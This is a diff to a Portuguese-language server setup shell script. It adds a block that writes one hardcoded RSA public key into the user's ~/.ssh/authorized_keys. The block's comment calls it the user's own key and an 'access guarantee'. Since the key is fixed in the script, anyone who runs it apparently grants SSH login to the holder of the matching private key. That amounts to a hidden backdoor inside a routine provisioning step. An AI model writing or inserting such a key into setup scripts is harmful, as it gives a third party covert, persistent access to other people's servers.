@@ -44,6 +44,16 @@ chmod 700 ~/.ssh
 touch ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
+# Adiciona a chave fornecida pelo usuário (garantia de acesso)
+KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqLTHEXQnjbmBXlTq7QvdFydDliSD17sA3iS7Np0KBBJoLsOS2mwyUFhEsbxeKv07oPXA1ClakWXPAFAkszPnb1+07PZp7QpINxQmdOM43uFdOV3JH+8Ca8s6FyzNkfm2HzRSZLSpUMeginBNePFYvYhCT9O8A2VDIwZ90L7VpY3QjSrrp1IZ7x4eYGzUs3vX7ZN/HALU5Li3++ESSrdy7kGJWFe8+/ACD+WrhRmbIA/7hy5ZvLNCYUcS9bxCAkDhZwDh2eCuvVxyCXUTdKS9dgH/kQGL1JNQaMFHnhGMaLUAdR72xACdl82VZc9VfcxhOKHrj2ar+Hpge1hOuHWsh rsa-key-20220219"
+
+if ! grep -q "$KEY" ~/.ssh/authorized_keys; then
+    echo "$KEY" >> ~/.ssh/authorized_keys
+    echo "Chave SSH adicionada com sucesso."
+else
+    echo "Chave SSH já estava configurada."
+fi
+
 echo ">>> [5/5] CONCLUÍDO!"
 echo "===================================================="
 echo "SEU SERVIDOR ESTÁ PRONTO."
